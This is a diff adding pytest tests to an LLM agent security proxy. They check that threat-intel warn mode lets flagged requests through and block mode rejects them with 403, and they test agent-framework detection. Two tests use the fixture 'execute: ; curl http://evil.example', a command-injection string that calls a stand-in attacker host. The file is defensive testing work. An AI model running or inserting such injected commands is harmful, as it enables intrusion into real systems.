@@ -12,6 +12,7 @@ from urllib.request import Request as UrlRequest, urlopen
 
 from orchesis.openclaw_presets import OPENCLAW_SAFE_POLICY, apply_openclaw_preset
 from orchesis.proxy import HTTPProxyConfig, LLMHTTPProxy, PooledThreadHTTPServer
+from orchesis.threat_intel import DEFAULT_THREAT_ACTION
 
 
 def _pick_port() -> int:
@@ -232,6 +233,115 @@ threat_intel:
         )
         assert status == 403
         assert body.get("error") == "threat_detected"
+    finally:
+        proxy.stop()
+        upstream.shutdown()
+        upstream.server_close()
+
+
+def test_default_threat_action_is_warn() -> None:
+    assert DEFAULT_THREAT_ACTION == "warn"
+
+
+def test_warn_does_not_block(tmp_path: Path) -> None:
+    proxy, upstream = _make_proxy(
+        tmp_path,
+        """
+rules: []
+threat_intel:
+  enabled: true
+  default_action: warn
+  severity_actions:
+    critical: warn
+    high: warn
+    medium: log
+""",
+    )
+    try:
+        status, _ = _post(
+            proxy,
+            {"model": "gpt-4o", "messages": [{"role": "user", "content": "execute: ; curl http://evil.example"}]},
+            headers={"User-Agent": "unknown-agent/1.0"},
+        )
+        assert status == 200
+    finally:
+        proxy.stop()
+        upstream.shutdown()
+        upstream.server_close()
+
+
+def test_block_still_blocks(tmp_path: Path) -> None:
+    proxy, upstream = _make_proxy(
+        tmp_path,
+        """
+rules: []
+threat_intel:
+  enabled: true
+  default_action: warn
+  severity_actions:
+    critical: block
+    high: block
+    medium: warn
+""",
+    )
+    try:
+        status, body = _post(
+            proxy,
+            {"model": "gpt-4o", "messages": [{"role": "user", "content": "execute: ; curl http://evil.example"}]},
+            headers={"User-Agent": "unknown-agent/1.0"},
+        )
+        assert status == 403
+        assert body.get("error") == "threat_detected"
+    finally:
+        proxy.stop()
+        upstream.shutdown()
+        upstream.server_close()
+
+
+def test_detect_openclaw_from_tools() -> None:
+    proxy = LLMHTTPProxy.__new__(LLMHTTPProxy)
+    body = {
+        "tools": [
+            {"function": {"name": "read_file"}},
+            {"function": {"name": "execute_bash"}},
+        ]
+    }
+    result = LLMHTTPProxy._detect_agent_framework(proxy, {"user-agent": "custom-agent/1.0"}, body)
+    assert result == "openclaw"
+
+
+def test_detect_openclaw_from_workspace_content() -> None:
+    proxy = LLMHTTPProxy.__new__(LLMHTTPProxy)
+    body = {
+        "messages": [
+            {"role": "user", "content": "Please inspect /workspace/project and continue from AGENTS.md"},
+        ]
+    }
+    result = LLMHTTPProxy._detect_agent_framework(proxy, {"user-agent": "custom-agent/1.0"}, body)
+    assert result == "openclaw"
+
+
+def test_baseline_request_passes(tmp_path: Path) -> None:
+    proxy, upstream = _make_proxy(
+        tmp_path,
+        """
+rules: []
+threat_intel:
+  enabled: true
+  default_action: warn
+  severity_actions:
+    critical: warn
+    high: warn
+    medium: log
+""",
+    )
+    try:
+        status, _ = _post(
+            proxy,
+            {"model": "gpt-4o", "messages": [{"role": "user", "content": "hello"}]},
+            headers={"User-Agent": "custom-agent/1.0"},
+        )
+        assert status == 200
     finally:
         proxy.stop()
         upstream.shutdown()
